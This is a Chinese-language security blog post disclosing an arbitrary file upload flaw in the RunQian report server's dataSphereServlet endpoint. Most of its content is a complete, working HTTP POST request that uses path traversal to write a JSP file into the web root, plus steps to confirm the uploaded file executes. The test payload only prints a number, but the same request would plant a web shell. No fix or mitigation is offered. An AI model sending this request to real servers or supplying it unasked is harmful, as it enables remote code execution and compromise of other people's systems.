#  润乾报表dataSphereServlet接口存在任意文件上传漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-04 20:27  
  
# 1. 漏洞描述  
  
  
    润乾报表是一个纯JAVA的企业级报表工具，支持对J2EE系统的嵌入式部署，无缝集成。服务器端支持各种常见的操作系统，支持各种常见的关系数据库和各类J2 EE的应用服务器，客户端采用标准纯html方式展现，支持ie和netscape， 润乾报表是领先的企业级报表分析软件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqk29AkQPbtib10CGiaUek83SkSAPVIfMFoibnqJSy0VVfehveEet6Kdm96g/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
POST /servlet/dataSphereServlet?action=38 HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 395
Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="openGrpxFile"; filename="539634.jsp"
Content-Type: text/plain

<% out.println("873227518"); %>
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="path"

../../../
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="saveServer"

1
--eac629ee4641cb0fe10596fba5e0c5d9--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqk9TIqeIMfwSw0Ql4PYojUsaY30oneMpLvkG17X77RzPQ4zb4iblicXuuQ/640?wx_fmt=png&from=appmsg "")  
  
	  
    拼接路径，尝试访问上传文件"539634.jsp"，查看文件是否上传成功，文件是否能够解析。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWrFTFHpA6V6uC9KEmlEAqknt1DdENPYCbGxtwqNJaUysE4ZtWslTwynSwmMgVdSDdXjvghm1n2Jg/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到文件成功解析，打印出873227518。  
  
